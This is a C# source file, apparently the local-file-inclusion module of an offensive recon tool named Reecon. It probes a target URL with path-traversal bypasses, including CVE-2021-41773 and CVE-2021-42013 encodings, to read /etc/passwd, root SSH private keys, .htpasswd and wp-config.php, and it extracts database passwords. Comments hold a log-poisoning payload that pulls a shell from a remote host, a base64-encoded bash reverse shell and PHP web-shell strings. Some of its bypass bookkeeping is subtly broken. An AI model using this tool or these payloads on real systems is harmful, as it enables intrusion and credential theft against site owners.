using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;

namespace Reecon
{
    class LFI
    {
        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0044:Add readonly modifier")]
        // private static WebClient wc = new();
        private static string baseURL = "";
        private static string baseLocation = "";
        private static int notFoundLength = 0;
        private static int notFoundLength2 = 0;
        private static int notFoundLength3 = 0;
        private static int bypassMethod = -1;
        private static string cookie = null;

        public static void Scan(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("LFI Usage: reecon -lfi http://www.site.com/bla.php?include=file optCookieName=cookievalue");
                return;
            }
            if (args.Length == 3)
            {
                Console.WriteLine("Setting cookie to: " + args[2]);
                cookie = args[2];
            }
            ScanPath(args[1]);
        }

        public static void ScanPath(string path)
        {
            if (!path.StartsWith("http"))
            {
                Console.WriteLine("Error: LFI path must start with http");
                return;
            }
            Console.WriteLine("Starting LFI Scan - This feature is still in Alpha");
            // Init
            InitialChecks(path);

            // Find OS
            var OS = GetOS();

            if (OS == General.OS.Linux)
            {
                Console.WriteLine("OS Detected as: Linux");
                Console.WriteLine("Running additional checks - Please wait...");
                List<string> linux_WebChecks = new()
                {
                    // General web checks
                    "/var/www/html/.htpasswd",
                    "/var/www/html/forum/.htpasswd",
                    "/var/www/",

                    // Wordpress
                    "/var/www/html/wp-config.php",
                    "/var/www/html/wordpress/wp-config.php",
                    "/var/www/wordpress/wp-config.php"
                };
                DoLFI(linux_WebChecks);

                // Do nginx specific checks
                List<string> linux_nginx = new()
                {
                    "/etc/nginx/sites-available/default"
                };
                DoLFI(linux_nginx);

                // Do Apache2 specific checks - https://packages.ubuntu.com/eoan/all/apache2/filelist
                List<string> linux_apache = new()
                {
                    "/etc/apache2/sites-available/000-default.conf"
                };
                bool hasApache = DoLFI(linux_apache);
                if (hasApache)
                {
                    // Check for .htpasswd
                    DoLFI(new List<string>() { "/etc/apache2/.htpasswd" });

                    // Apache2 Log Poisoning Path (Very restricted): 
                    bool apache2Log = DoLFI(new List<string>() { "/var/log/apache2/access.log" });
                    if (apache2Log)
                    {
                        // Log poisoning file upload
                        // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
                        // The below line is virus-flagged by "Rising", "Sangfor Engine Zero", and "Tencent" - But not by Defender (It is if you change woofles to cmd) 
                        // Mozilla/5.0 <?php system($_GET['woofles']);?> Firefox/70.0 if no callbacks allowed / you can't find the file
                        Console.WriteLine("LFI - Log Poisoning File Upload - Bug Reelix");
                    }
                }

                // Do some logging checks
                List<string> linux_logs = new()
                {
                    "/var/log/vsftpd.log", // FTP
                    "/var/log/auth.log" // SSH 
                };
                DoLFI(linux_logs);

                // Do MySQL Checks
                List<string> linux_mysql = new()
                {
                    "/etc/my.cnf",
                    "/etc/mysql/my.cnf",
                    "/var/log/mysql/error.log"
                };
                DoLFI(linux_mysql);

                // Do Tomcat9 Checks - https://packages.ubuntu.com/eoan/all/tomcat9/filelist
                List<string> linux_tomcat9 = new()
                {
                    "/etc/cron.daily/tomcat9",
                    "/etc/rsyslog.d/tomcat9.conf",
                    "/usr/lib/sysusers.d/tomcat9.conf",
                    "/usr/lib/tmpfiles.d/tomcat9.conf",
                    "/usr/libexec/tomcat9/tomcat-start.sh",
                    "/usr/share/tomcat9/etc/server.xml",
                    "/usr/share/tomcat9/etc/tomcat-users.xml",
                    "/usr/share/tomcat9/etc/web.xml",
                    "/var/lib/tomcat9/webapps/ROOT/index.html"
                };
                DoLFI(linux_tomcat9);

                // Do basic SSH Checks - https://evi1us3r.wordpress.com/lfi-cheat-sheet/
                List<string> linux_ssh = new()
                {
                    "/etc/ssh/ssh_config",
                    "/etc/ssh/sshd_config",
                    "/root/.ssh/id_rsa",
                    "/root/.ssh/authorized_keys",
                    "/var/log/auth.log"
                };
                DoLFI(linux_ssh);

                // Linux - Misc
                List<string> linux_misc = new()
                {
                    "/etc/laurel/config.toml" // Tell if exists - Nothing super useful though
                    // /var/log/laurel
                };
                DoLFI(linux_misc);

            }
            else if (OS == General.OS.Windows)
            {
                Console.WriteLine("OS Detected as: Windows");
                // Do IIS Checks
                Console.WriteLine("LFI - Windows - Bug Reelix");
            }
            else
            {
                Console.WriteLine("LFI - Unknown OS - Bug Reelix");
                // Unknown - Do All Checks
            }
            Console.WriteLine("All Checks Done!");
            if (OS == General.OS.Linux)
            {
                Console.WriteLine("Note: If you can create sessions, they can be stored in /tmp/ses_SESSID");
            }
        }

        // Initial Checks
        private static void InitialChecks(string path)
        {
            Console.WriteLine("Scanning: " + path);

            // First, check to make sure that the initial version works
            HttpStatusCode statusCode = General.GetResponseCode(path, cookie);
            if (statusCode != HttpStatusCode.OK)
            {
                Console.WriteLine(path + " is not an OK page :(");
                Environment.Exit(0);
            }

            // Split the URL - Can't just split since the location could contain an =
            baseURL = path.Substring(0, path.IndexOf("=") + 1);
            baseLocation = path.Remove(0, path.IndexOf("=") + 1);

            // Run checks to determine what an invalid path returns
            Console.WriteLine("Determining invalid path results...");

            // NFL1 - A regular invalid path
            string result = Web.GetHTTPInfo(baseURL + "Reelix", Cookie: cookie).PageText;
            notFoundLength = result.Length; // Check for cases where the page text contains the URL?
            // Some not-found pages can be blank
            if (notFoundLength < 0)
            {
                notFoundLength = 0;
            }
            Console.WriteLine("Invalid Path 1/3 Length: " + notFoundLength);

            // NFL2 - An invalid path with 2 dots
            result = Web.GetHTTPInfo(baseURL + "Ree..lix", Cookie: cookie).PageText;
            notFoundLength2 = result.Length;
            if (notFoundLength2 < 0)
            {
                notFoundLength2 = 0;
            }
            Console.WriteLine("Invalid Path 2/3 Length: " + notFoundLength2);

            // NFL3 - An invalid path, but the error message contains the path itself
            result = Web.GetHTTPInfo(baseURL + "/some/file/name.txt", Cookie: cookie).PageText;
            notFoundLength3 = result.Replace("/some/file/name.txt", "").Length;
            if (notFoundLength3 < 0)
            {
                notFoundLength3 = 0;
            }
            Console.WriteLine("Invalid Path 3/3 Length: " + notFoundLength3);
        }

        private static General.OS GetOS()
        {
            Console.WriteLine("Running OS Checks...");
            // Linux
            List<string> linuxChecks = new()
            {
                "/etc/./passwd", // The . is intentional - It's a mini firewall bypass
                "/etc/passwd",
                "/etc/resolv.conf",
                "/var/www/index.php",
                "/var/www/html/index.php",
                "/etc/hostname", // Box Hostname
                "/etc/hosts",
                "/etc/issue", // Shows the Release
                "/etc/group", // Groups
                "/proc/self/cmdline" // Running commandline
            };
            bool hasResult = DoLFI(linuxChecks);
            if (hasResult)
            {
                return General.OS.Linux;
            }

            // Windows
            List<string> windowsChecks = new()
            {
                "/boot.ini", // Basic boot.ini
                "/inetpub/wwwroot/index.php", // Basic IIS Webserver
                "/Windows/debug/NetSetup.log", // Some basic Windows info
                "/Windows/SoftwareDistribution/ReportingEvents.log", // Windows Patches
                "/Windows/System32/cmd.exe", // What Windows box doesn't have cmd?
                "/Windows/win.ini" // Should have this

                // xampp/apache/logs/access.log
            };
            hasResult = DoLFI(windowsChecks);
            if (hasResult)
            {
                return General.OS.Windows;
            }

            return General.OS.Unknown;
        }

        private static bool DoLFI(List<string> lfiChecks)
        {
            // To Implement:
            // We only need to do a bypass once on the initial OS check.
            // If it's working, it's working - Don't need to try each bypass every time
            // Maybe base64'ing PHP might be useful though...

            // TODO: Null Byte each
            // TODO: Base64 Encode Each --> bla=php://filter/convert.base64-encode/resource=locationHere
            // TODO: UTF8 Each --> bla=php://filter/convert.iconv.utf-8.ascii/resource=locationHere (Thanks spymky)
            // TODO: Assert RCE Exploit: ' and die (show_source('/etc/passwd')) or '
            // ' and die (system('echo YmFzaCAtaSAmPi9kZXYvdGNwLzE5Mi4xNjguNDkuNTYvOTAwMSA8JjE= | base64 -d | bash')) or '
            // TODO: Assert Exploit -> ', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('

            // https://academy.hackthebox.com/module/23/section/253
            // TODO: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id (PHP) -> PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg== -> <?php system($_GET["cmd"]); ?>

            // TODO: expect://id
            // If it must contain a word
            // php://filter/read=convert.base64-encode/wordhere/resource=flag

            // ../ bypass: %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
            // More: https://book.hacktricks.xyz/pentesting-web/file-inclusion

            // Note: Paths can sometimes be quite deep - Use a base of 7 folders up
            // Bypass Method 0: {PATH}
            // Bypass Method 1: /../../../../../..{PATH}
            // Bypass Method 2: /../../../../../..{PATH}%00
            // Bypass Method 3: /../../../../../..{PATH}%00.ext
            // Bypass Method 4: CVE-2021-41773 - .%2e/.%2e/.%2e/.%2e/.%2e{PATH}
            // Bypass Method 5: CVE-2021-42013 - %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65{PATH}
            // Bypass Method 6: Non-Recursive Strip - /../.../...//../.../...//../.../...//../.../...//../.../.../{PATH}
            // Bypass Method 7: Double URL Encoding: %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f (../../../../{PATH})

            bool hasResult = false;
            foreach (string check in lfiChecks)
            {
                // Method 0 - {PATH}
                if (bypassMethod == -1)
                {
                    Console.WriteLine($"Testing: {{PATH}} with {check}");
                }
                if (bypassMethod == -1 || bypassMethod == 0)
                {
                    string toCheck = baseURL + check;
                    int bypassLength = 0; // No bypass
                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                    if (isLFI && bypassMethod == -1)
                    {
                        hasResult = true;
                        bypassMethod = 0;
                    }
                }
                // Method 1: /../../../../../..{PATH}
                if (bypassMethod == -1)
                {
                    Console.WriteLine($"Testing: /../../../../../..{{PATH}} with {check}");
                }
                if (bypassMethod == -1 || bypassMethod == 1)
                {
                    string toCheck = baseURL + "/../../../../../.." + check;
                    int bypassLength = "/../../../../../..".Length;
                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                    if (isLFI && bypassMethod == -1)
                    {
                        hasResult = true;
                        bypassMethod = 1;
                    }
                }

                // Method 2: /../../../../../..{PATH}%00
                if (bypassMethod == -1)
                {
                    Console.WriteLine($"Testing: /../../../../../..{{PATH}}%00 with {check}");
                }
                if (bypassMethod == -1 || bypassMethod == 2)
                {
                    string toCheck = baseURL + "/../../../../../.." + check + "%00";
                    int bypassLength = "/../../../../../...".Length + "%00".Length;
                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                    if (isLFI && bypassMethod == -1)
                    {
                        hasResult = true;
                        bypassMethod = 2;
                    }
                }

                // Method 3: /../../../../..{PATH}%00.ext
                if (bypassMethod == -1 && baseLocation.Contains('.'))
                {
                    Console.WriteLine($"Testing: /../../../../..{{PATH}}%00.ext with {check}");
                }
                if (bypassMethod == -1 || bypassMethod == 3)
                {
                    string ext = baseLocation.Remove(0, baseLocation.IndexOf(".") + 1);
                    string toCheck = baseURL + "/../../../../.." + check + $"%00.{ext}";
                    int bypassLength = "/../../../../..".Length + "%00.".Length + ext.Length;
                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                    if (isLFI && bypassMethod == -1)
                    {
                        hasResult = true;
                        bypassMethod = 3;
                    }
                }

                // Method 4: CVE-2021-41773 - .%2e/.%2e/.%2e/.%2e/.%2e{PATH}
                if (bypassMethod == -1)
                {
                    Console.WriteLine($"Testing: .%2e/.%2e/.%2e/.%2e/.%2e{{PATH}} with {check}");
                }
                if (bypassMethod == -1 || bypassMethod == 5)
                {
                    string toCheck = baseURL + ".%2e/.%2e/.%2e/.%2e/.%2e" + check;
                    int bypassLength = ".%2e/.%2e/.%2e/.%2e/.%2e".Length;
                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                    if (isLFI && bypassMethod == -1)
                    {
                        hasResult = true;
                        bypassMethod = 4;
                    }
                }

                // Method 5: CVE-2021-42013 - %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65{PATH}
                if (bypassMethod == -1)
                {
                    Console.WriteLine($"Testing: %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65{{PATH}} with {check}");
                }
                if (bypassMethod == -1 || bypassMethod == 5)
                {
                    string toCheck = baseURL + "%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65" + check;
                    int bypassLength = "%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65".Length;
                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                    if (isLFI && bypassMethod == -1)
                    {
                        hasResult = true;
                        bypassMethod = 5;
                    }
                }

                // Method 6 - Non-Recursive Strip - /../.../...//../.../...//../.../...//../.../...//../.../.../{PATH}
                if (bypassMethod == -1)
                {
                    Console.WriteLine($"Testing: /../.../...//../.../...//../.../...//../.../...//../.../.../{{PATH}} with {check}");
                }
                if (bypassMethod == -1 || bypassMethod == 6)
                {
                    string toCheck = baseURL + "/../.../...//../.../...//../.../...//../.../...//../.../.../" + check;
                    int bypassLength = "/../.../...//../.../...//../.../...//../.../...//../.../.../".Length;
                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                    if (isLFI && bypassMethod == -1)
                    {
                        hasResult = true;
                        bypassMethod = 6;
                    }
                }

                // Method 7: Double URL Encoding: %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f (../../../../{PATH})
                if (bypassMethod == -1)
                {
                    Console.WriteLine($"Testing: Bypass Method 7: Double URL Encoding: %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f (../../../../{{PATH}}) with {check}");
                }
                if (bypassMethod == -1 || bypassMethod == 7)
                {
                    string toCheck = baseURL + "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f" + check;
                    int bypassLength = "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f".Length;
                    bool isLFI = TestLFI(toCheck, check, bypassLength);
                    if (isLFI && bypassMethod == -1)
                    {
                        hasResult = true;
                        bypassMethod = 6;
                    }
                }
            }
            return hasResult;
        }

        private static bool TestLFI(string fullPath, string check, int bypassLength)
        {
            try
            {
                var requestResult = Web.GetHTTPInfo(fullPath, Cookie: cookie);
                if (requestResult.AdditionalInfo == "Timeout")
                {
                    Console.WriteLine("- " + fullPath + " -- Timeout :(");
                    return false;
                }
                string result = requestResult.PageText;
                int resultLength = result.Length;
                if (
                    // NFL 1
                    resultLength != notFoundLength && resultLength != (notFoundLength + check.Length + bypassLength)
                    // NFL 2
                    && resultLength != notFoundLength2 && resultLength != (notFoundLength2 + check.Length + bypassLength)
                    // NFL 3
                    && (resultLength - (check.Length + bypassLength) != notFoundLength3)
                    && !result.Contains("failed to open stream")
                    && !result.Contains("Attack detected") // Firewall
                   )
                {
                    Console.WriteLine("- " + fullPath + " (Len: " + resultLength + ")");
                    ParseUsefulEntries(check, result);
                    return true;
                }
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine("LFI Bug - Bug Reelix: " + ex.Message);
                return false;
                // Nope!
            }
        }

        private static void ParseUsefulEntries(string check, string pageText)
        {
            if (check == "/etc/passwd" || check == "/etc/./passwd")
            {
                if (pageText.Contains("root:x:0:0:root:/root"))
                {
                    string passwdText = pageText.Remove(0, pageText.IndexOf("root:x:0:0:root:/root"));
                    List<string> pageLines = passwdText.Replace("\r", "").Split('\n').ToList();
                    foreach (string line in pageLines)
                    {
                        if (line.Contains("/bin/bash") || line.Contains("/home"))
                        {
                            Console.WriteLine("----> " + line);
                        }
                    }
                }
            }
            else if (check == "/etc/hosts")
            {
                if (pageText.Contains("Kubernetes-managed"))
                {
                    Console.WriteLine("-- Kubernetes Detected (And Confirmed by secondary testing)");
                }
            }
            else if (check == "wp-config.php")
            {
                if (pageText.Contains("DB_USER'") && pageText.Contains("DB_PASSWORD'"))
                {
                    string userText = pageText.Remove(0, pageText.IndexOf("DB_USER'") + 8);
                    userText = userText.Remove(0, (userText.IndexOf("'") + 1));
                    userText = userText.Substring(0, userText.IndexOf("' );"));
                    Console.WriteLine("----> Wordpress Database Username: " + userText);

                    string passText = pageText.Remove(0, pageText.IndexOf("DB_PASSWORD'") + 12);
                    passText = passText.Remove(0, (passText.IndexOf("'") + 1));
                    passText = passText.Substring(0, passText.IndexOf("' );"));
                    Console.WriteLine("----> Wordpress Database Password: " + passText);
                }
            }
        }
    }
}